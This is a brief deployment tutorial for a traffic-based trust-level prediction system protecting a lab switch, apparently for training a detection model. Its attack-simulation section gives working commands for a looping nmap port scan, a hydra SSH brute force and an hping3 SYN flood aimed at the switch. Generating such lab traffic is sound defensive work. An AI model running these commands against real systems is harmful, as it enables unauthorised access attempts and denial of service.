
# Deployment Tutorial

## File Structure
- **collector_data.py**: Data collection script
- **train_model.py**: Model training script
- **trust_api.py**: Model prediction API
- **realtime_agent.py**: Real-time trust level prediction agent
- **requirements.txt**: Python environment dependencies

## Deployment Steps

### Step 1: Environment Setup
```bash
sudo apt install python3-pip net-tools tshark -y
pip install -r requirements.txt
```

### Step 2: Launch Services
Open a new terminal:
```bash
python3 trust_api_advanced.py
```

Open another new terminal:
```bash
python3 realtime_agent.py
```

## Network Topology Configuration
- Connect the attack machine to a switch port
- Switch IP: `192.168.100.1`
- Attacker IP: `192.168.100.12`

## Attack Simulation (execute on attack machine)
*Note: Required toolkits must be installed on the attack machine*

### ① Normal Traffic (Trust Level 3)
*No specific command provided*

### ② Port Scanning (Trust Level 2, non-disruptive to switch)
```bash
while true; do nmap -sS -p- 192.168.100.1; sleep 2; done
```

### ③ SSH Brute Force (Trust Level 1, disables switch SSH functionality)
```bash
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://192.168.100.1
```

### ④ SYN Flood Attack (Trust Level 0, crashes entire switch)
```bash
sudo hping3 -S -i u1 -V -p 80 192.168.100.1
```
```
